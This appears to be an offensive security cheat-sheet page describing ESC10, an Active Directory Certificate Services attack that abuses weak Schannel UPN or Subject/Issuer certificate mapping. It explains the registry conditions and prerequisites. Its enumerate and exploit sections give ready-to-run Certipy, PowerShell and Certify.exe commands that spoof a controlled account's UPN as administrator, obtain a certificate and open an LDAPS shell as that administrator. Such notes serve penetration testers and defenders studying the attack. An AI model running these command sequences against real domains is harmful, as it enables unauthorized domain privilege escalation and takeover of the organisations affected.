# ESC10

{% hint style="info" %}
Implicit Weak Certificate Mapping (Enrolee can modify own UPN to request cert on behalf of ANY user)
{% endhint %}

## Why It Works

* ESC10 is the **Schannel (TLS client-cert auth / LDAPS)** counterpart to ESC9's Kerberos PKINIT attack. It's controlled by two DC registry values under `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel`, rather than a per-template flag:
  * **Case 1 - `CertificateMappingMethods` includes `0x4` (UPN mapping):** Schannel maps an incoming client certificate to an account by matching the cert's UPN against an account's `userPrincipalName`, with no stronger binding check.
  * **Case 2 - Subject/Issuer mapping:** the DC maps certs based on Subject+Issuer name matching rather than an explicit strong SID binding.
* Same spoofing logic as ESC9 applies: change your controlled account's UPN to the target's identity, enroll for a cert, revert the UPN, then use the cert for **Schannel-based auth** (e.g. LDAPS bind) instead of Kerberos.
* This matters separately from ESC9 because some environments harden Kerberos PKINIT (`StrongCertificateBindingEnforcement=2`) but forget the equivalent Schannel registry hardening.

## Prerequisites

* `CertificateMappingMethods` registry value on DC(s) includes weak mapping bits (`0x4` UPN, or Subject/Issuer mapping enabled).
* Ability to enroll for a Client Authentication-capable certificate and to write your own/a victim's `userPrincipalName`.

## Enumerate

```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
## Reports Schannel 'CertificateMappingMethods' value alongside ESC9/ESC10 flags
```

## Exploit

{% tabs %}
{% tab title="Certipy" %}
{% code lineNumbers="true" %}
```bash
## Same UPN-spoof pattern as ESC9, but authenticate over LDAPS/Schannel instead of Kerberos
certipy account update -u <user>@<domain> -p <password> -dc-ip <DC-IP> -user <controlled-account> -upn administrator
certipy req -u <controlled-account>@<domain> -p <password> -ca <CA-Name> -template <client-auth-template>
certipy account update -u <user>@<domain> -p <password> -dc-ip <DC-IP> -user <controlled-account> -upn <controlled-account>@<domain>
certipy auth -pfx administrator.pfx -dc-ip <DC-IP> -ldap-shell
```
{% endcode %}
{% endtab %}

{% tab title="PowerShell/RSAT + Certify" %}
{% hint style="warning" %}
Windows lacks a simple built-in CLI for LDAPS bind-with-client-certificate (unlike Certipy's `-ldap-shell`). Practically, once you have the `.pfx`, it's easiest to import it into the current user's certificate store and use `System.DirectoryServices.Protocols` in PowerShell, or just transfer the `.pfx` to a Linux box and finish with `certipy auth -ldap-shell` for the actual LDAPS/Schannel step.
{% endhint %}

```powershell
## 1 & 2 - UPN spoof + enrollment work the same as ESC9 from Windows
Set-ADUser -Identity <controlled-account> -UserPrincipalName administrator
Certify.exe request /ca:<CA-ServerDomain>\<CA-Username> /template:<client-auth-template>
Set-ADUser -Identity <controlled-account> -UserPrincipalName <controlled-account>@<domain>
```
{% endtab %}
{% endtabs %}
